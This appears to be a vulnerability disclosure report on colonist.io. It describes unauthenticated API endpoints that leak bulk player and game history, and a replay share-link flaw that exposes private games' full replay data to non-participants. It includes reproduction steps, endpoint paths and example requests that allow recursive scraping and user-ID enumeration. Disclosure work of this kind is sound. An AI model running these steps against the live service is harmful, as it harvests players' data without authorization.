# Executive Summary

# Colonist.io API Exposes Bulk Player History and Non-Participant Full Replay JSON

# Executive Summary

This review validated two reportable security issues on \`https://colonist.io\`.

First, unauthenticated API endpoints expose player profile identifiers and recent game history at bulk scale. A requester with no session can obtain live player usernames, convert disclosed or guessed numeric user IDs into usernames, and pull up to 100 completed games per player. The returned data includes internal numeric user IDs for co-players, usernames, game IDs, player colors, ranks, points, quit status, selected device values, game settings, \`privateGame\` flags, ranked/ELO indicators, turn counts, durations, and replay availability flags. In the bounded sample, 69,627 unique players and 86,266 unique games were confirmed exposed, including 3,021 private games and 62,818 games marked as having replay data.

Second, an authenticated regular user was able to resolve existing replay share links for games where the user was not a participant, including private games. The returned share links could then be used without authentication to fetch full replay JSON. The replay JSON includes database game IDs, player user states, game settings, initial board/game state, and hundreds of move-by-move event/state-change records. In the bounded validation, 24 replay JSON objects were fetched for games where the session user was not a participant, covering 11 unique games, including 9 private games.

Severity decision: both confirmed findings are High. The run did not validate account takeover, payment bypass, live usable token compromise, or unrestricted direct replay extraction for every game ID, so no Critical finding is claimed.

# Finding 1 \- 1 Unauthenticated Bulk Player History 

# Finding 1: Unauthenticated Bulk Player History and Game Metadata Exposure

Severity: High

Affected host: \`https://colonist.io\`

Affected endpoints:

\- \`GET /api/game-list.json\`  
\- \`GET /api/leaderboards/{mode}/\`  
\- \`GET /api/leaderboards-username-search/{mode}/?usernameSearchInput={query}\`  
\- \`GET /api/profile/{username}/history\`  
\- \`GET /api/profile/{username}/overview\`  
\- \`GET /api/profile/{username}/items\`  
\- \`GET /api/profile/{username}/sticky-player-info\`  
\- \`GET /api/profile/{username}/ranked/{season}\`  
\- \`GET /api/profile/{numericUserId}/username\`

Required role/session: None. The confirmed requests were sent without authentication cookies or authorization headers.

Confirmed affected count:

\- 69,627 unique players discovered in a bounded bulk sample.  
\- 86,266 unique games discovered in the same sample.  
\- 3,021 unique games were marked \`privateGame: true\`.  
\- 62,818 unique games were marked \`hasReplay: true\`.  
\- 2,376 unique private games were also marked \`hasReplay: true\`.  
\- 42,323 unique ranked or ELO games were identified.  
\- A bounded sequential numeric-ID scan of 200 IDs returned usernames for 154 IDs.

Where it was found: The public client route map references the profile/history, ranked, overview, item, sticky profile, leaderboard, game list, and numeric user ID to username endpoints. Direct API requests then confirmed that the endpoints return data without a session.

Reproduction steps:

1\. Open a clean HTTP client with no \`Cookie\` or \`Authorization\` header.  
2\. Request \`GET /api/game-list.json\` to obtain live player usernames.  
3\. Choose a returned username and request \`GET /api/profile/{username}/history\`.  
4\. Observe that the response includes \`profileUserId\` and up to 100 \`gameDatas\` entries for that player.  
5\. Extract \`gameDatas\[\].players\[\].userId\` and \`gameDatas\[\].players\[\].username\` from the response.  
6\. Repeat the history request for newly discovered usernames to recursively expand the dataset.  
7\. Optionally request \`GET /api/profile/{numericUserId}/username\` for numeric IDs observed in game histories or sequentially guessed IDs; the endpoint returns usernames for valid IDs without authentication.  
8\. Use the resulting username to request \`/overview\`, \`/ranked/{season}\`, \`/sticky-player-info\`, or \`/items\` without authentication.

Example request:

GET /api/profile/\<redacted\_username\>/history HTTP/2  
Host: colonist.io  
Accept: application/json, text/plain, \*/\*  
User-Agent: Mozilla/5.0

Example response:

{  
  "profileUserId": "103195981",  
  "gameDatas": \[  
    {  
      "id": "233285998",  
      "setting": {  
        "id": "card7851",  
        "gameType": 3,  
        "privateGame": true,  
        "eloType": 0,  
        "modeSetting": 0,  
        "mapSetting": 0,  
        "diceSetting": 1,  
        "victoryPointsToWin": 10,  
        "maxPlayers": 4,  
        "gameSpeed": 1,  
        "hideBankCards": false  
      },  
      "startTime": "1780240144174",  
      "duration": "2092947",  
      "turnCount": 60,  
      "finished": true,  
      "hasReplay": true,  
      "players": \[  
        {  
          "userId": "103152269",  
          "username": "\<redacted\_player\_1\>",  
          "playerColor": 3,  
          "rank": 2,  
          "points": 8,  
          "finished": true,  
          "quitWithPenalty": false,  
          "selectedDevice": null,  
          "isHuman": true  
        },  
        {  
          "userId": "103194831",  
          "username": "\<redacted\_player\_2\>",  
          "playerColor": 1,  
          "rank": 1,  
          "points": 10,  
          "finished": true,  
          "quitWithPenalty": false,  
          "selectedDevice": null,  
          "isHuman": true  
        }  
      \]  
    }  
  \]  
}

Example numeric-ID enumeration request:

GET /api/profile/96726650/username HTTP/2  
Host: colonist.io  
Accept: application/json, text/plain, \*/\*  
User-Agent: Mozilla/5.0

Example numeric-ID response:

{  
  "username": "\<redacted\_username\>"  
}

Impact:

The issue exposes a bulk, unauthenticated player and game-history dataset. The exposed data includes internal numeric user IDs, usernames, game IDs, co-player relationships, player colors, ranks, scores, quit/penalty outcomes, selected device values, game settings, private-game indicators, ranked/ELO indicators, turn counts, durations, countries/current-login state from adjacent public profile endpoints, and replay availability flags. IDs are not only guessed; they are also disclosed by the API itself in history responses and can be recursively fed back into profile lookups.

This enables reconstruction of a large portion of the player graph and recent game graph without logging in. Private games are included in the exposed history metadata, even though users would reasonably expect private-game participation and settings to have a narrower audience than arbitrary unauthenticated clients.

Validation notes:

The positive control returned protected data, not just a non-401 status or a 200 response with an application-level error. The unauthenticated \`history\` response contained real \`profileUserId\`, real game IDs, real co-player internal user IDs, real usernames, private-game flags, replay flags, score/rank data, and game settings. The bounded bulk sample confirmed 69,627 unique players and 86,266 unique games. The required role was unauthenticated.

Pre-publish severity gate: Did the positive control return protected data or a confirmed mutation, or just a non-401 / 200-with-app-error response? The positive control returned protected player/game data. It was not merely a non-401 or 200-with-error response.

# Finding 2 \- 2 Authenticated NonParticipant Can Res

# Finding 2: Authenticated Non-Participant Can Resolve Existing Replay Share Links and Fetch Full Replay JSON

Severity: High

Affected host: \`https://colonist.io\`

Affected endpoints:

\- \`GET /api/replay/shareable-link?gameId={gameId}\&playerColor={playerColor}\`  
\- \`GET /api/replay/data-from-slug?replayUrlSlug={slug}\`

Required role/session:

\- A regular authenticated Colonist session was required to call \`/api/replay/shareable-link\`.  
\- No authentication was required to call \`/api/replay/data-from-slug\` once a share slug was known.  
\- The authenticated session used for validation was not a participant in the replay JSON objects that were successfully fetched.

Confirmed affected count:

\- 179 \`gameId\` and \`playerColor\` pairs were tested against the share-link endpoint.  
\- 24 pairs returned existing replay share links.  
\- The 24 share links resolved to full replay JSON for 24 non-participant replay views.  
\- The 24 replay JSON objects covered 11 unique games.  
\- 9 of the 11 unique games were private games.  
\- 155 tested pairs returned application-level errors and did not expose replay slugs.  
\- A separate random current-history control resolved 0 slugs from 600 tested pairs, so this finding is limited to games with existing share slugs. It does not prove direct replay extraction for every \`hasReplay\` game.

Where it was found: The public replay client code shows two replay data paths: a slug-based replay loader and a direct \`gameId\`/\`playerColor\` replay loader. The replay share controller calls the share-link API with a database game ID and perspective color. Public history APIs expose game IDs and player colors at scale, which provided safe candidate IDs for read-only validation.

Reproduction steps:

1\. Log in as a normal Colonist user who did not participate in the target game.  
2\. Obtain a valid \`gameId\` and \`playerColor\` pair from exposed game history metadata or another disclosed source.  
3\. Request \`GET /api/replay/shareable-link?gameId={gameId}\&playerColor={playerColor}\` using the authenticated session.  
4\. If the game already has an existing share slug for that game/perspective, observe that the API returns a shareable replay URL instead of rejecting the non-participant.  
5\. Extract the replay slug from the returned URL.  
6\. In a separate unauthenticated request, call \`GET /api/replay/data-from-slug?replayUrlSlug={slug}\`.  
7\. Observe that the API returns full replay JSON, including database game ID, player user states, private-game settings, initial state, and move-by-move event/state-change data.

Example authenticated share-link request:

GET /api/replay/shareable-link?gameId=235237759\&playerColor=1 HTTP/2  
Host: colonist.io  
Accept: application/json, text/plain, \*/\*  
Cookie: jwt\_colonist.io=\<redacted\_authenticated\_session\>  
User-Agent: Mozilla/5.0

Example share-link response:

"https://colonist.io/replay/\<redacted\_share\_slug\>"

Example unauthenticated replay-data request:

GET /api/replay/data-from-slug?replayUrlSlug=\<redacted\_share\_slug\> HTTP/2  
Host: colonist.io  
Accept: application/json, text/plain, \*/\*  
User-Agent: Mozilla/5.0

Example replay-data response:

{  
  "data": {  
    "databaseGameId": "235237759",  
    "playerPerspective": 1,  
    "playOrder": \[5, 1, 2, 4\],  
    "playerUserStates": \[  
      {  
        "userId": "91720642",  
        "username": "\<redacted\_player\_1\>",  
        "countryCode": "BR",  
        "deviceType": 1,  
        "membership": null,  
        "selectedColor": 5  
      },  
      {  
        "userId": "89813477",  
        "username": "\<redacted\_player\_2\>",  
        "countryCode": "BR",  
        "deviceType": 1,  
        "membership": 4,  
        "selectedColor": 1  
      }  
    \],  
    "gameSettings": {  
      "id": "event490",  
      "gameType": 8,  
      "privateGame": true,  
      "modeSetting": 6,  
      "mapSetting": 0,  
      "diceSetting": 0,  
      "victoryPointsToWin": 13,  
      "hideBankCards": true  
    },  
    "eventHistory": {  
      "version": 0,  
      "startTime": "\<redacted\_timestamp\>",  
      "initialState": {  
        "diceState": { "diceThrown": false, "dice1": 1, "dice2": 1 },  
        "bankState": { "hideBankCards": true, "resourceCards": { "1": 19 } },  
        "mapState": { "tileHexStates": { "0": { "x": 0, "y": \-2 } } }  
      },  
      "events": \[  
        {  
          "input": { "deltaS": 0 },  
          "stateChange": { "currentState": {}, "gameLogState": {} }  
        }  
      \],  
      "eventsPerspectives": \[1\]  
    }  
  }  
}

Impact:

A normal authenticated user can resolve existing share links for games they did not participate in. Once the slug is obtained, the replay JSON is accessible without authentication. This exposes full replay content for non-participant games, including private games.

The replay JSON is materially more sensitive than the public history metadata. It includes the database game ID, player user states, selected colors, country codes, device types, membership values, game settings, initial board/game state, end-game statistics, and move-by-move event/state-change records. The observed event histories contained hundreds of events per game, such as 431, 514, 565, and 630 events in sampled replay JSON responses.

This finding is intentionally scoped to existing share slugs that can be resolved by the share-link endpoint. The run did not validate unrestricted direct replay extraction from \`/api/replay/data-from-game-id\` for arbitrary games; that direct loader returned authorization errors for tested non-participant games.

Validation notes:

The positive control returned protected data, not just a non-401 status or a 200 response with an application-level error. The authenticated share-link response returned real replay URLs for non-participant games, and the unauthenticated slug endpoint returned full replay JSON. The session user was not a participant in the 24 replay JSON objects successfully fetched. The confirmed affected set was 24 replay JSON objects covering 11 unique games, including 9 private games.

Pre-publish severity gate: Did the positive control return protected data or a confirmed mutation, or just a non-401 / 200-with-app-error response? The positive control returned protected full replay JSON for non-participant games. It was not merely a non-401 or 200-with-error response.

# Plain-English Summary

# Plain-English Summary

1\. Bulk player history exposure \- 86,266 games exposed without login \- 69,627 players  
2\. Non-participant replay access \- 24 full replays exposed to non-player \- 11 games

# Public Company Context

# Public Company Context

\- Goktug Yilmaz \- Co-founder, Product  
\- Demi Yilmaz \- Co-founder, Hiring & Marketing  
\- Jeff d'Eon \- Game Dev, Backend

Company website: https://colonist.io  
